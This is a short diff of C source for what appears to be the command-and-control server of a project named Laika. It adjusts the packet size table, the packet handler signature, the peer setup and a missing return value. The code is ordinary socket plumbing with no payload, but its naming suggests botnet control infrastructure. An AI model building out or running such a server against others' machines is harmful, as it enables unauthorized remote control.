@@ -4,11 +4,10 @@
 #include "cnc.h"
 
 size_t laikaC_pktSizeTbl[LAIKAPKT_MAXNONE] = {
-    [LAIKAPKT_HANDSHAKE_REQ] = LAIKA_MAGICLEN + sizeof(uint8_t) + sizeof(uint8_t),
-    [LAIKAPKT_HANDSHAKE_RES] = sizeof(uint8_t)
+    [LAIKAPKT_HANDSHAKE_REQ] = LAIKA_MAGICLEN + sizeof(uint8_t) + sizeof(uint8_t)
 };
 
-void laikaC_pktHandler(struct sLaika_peer *peer, LAIKAPKT_ID id) {
+void laikaC_pktHandler(struct sLaika_peer *peer, LAIKAPKT_ID id, void *uData) {
     printf("got %d packet id!\n", id);
 }
 
@@ -24,6 +23,8 @@ struct sLaika_cnc *laikaC_newCNC(uint16_t port) {
 
     /* add sock to pollList */
     laikaP_addSock(&cnc->pList, &cnc->sock);
+
+    return cnc;
 }
 
 void laikaC_freeCNC(struct sLaika_cnc *cnc) {
@@ -54,8 +55,9 @@ bool laikaC_pollPeers(struct sLaika_cnc *cnc, int timeout) {
         if (evnts[i].sock == &cnc->sock) { /* event on listener? */
             peer = laikaS_newPeer(
                 laikaC_pktHandler,
+                laikaC_pktSizeTbl,
                 &cnc->pList,
-                laikaC_pktSizeTbl
+                (void*)cnc
             );
 
             /* setup and accept new peer */
@@ -63,7 +65,7 @@ bool laikaC_pollPeers(struct sLaika_cnc *cnc, int timeout) {
             laikaS_setNonBlock(&peer->sock);
 
             /* add to our pollList */
-            laikaP_addSock(&cnc->pList, (struct sLaika_sock*)peer);
+            laikaP_addSock(&cnc->pList, &peer->sock);
             continue;
         }
 
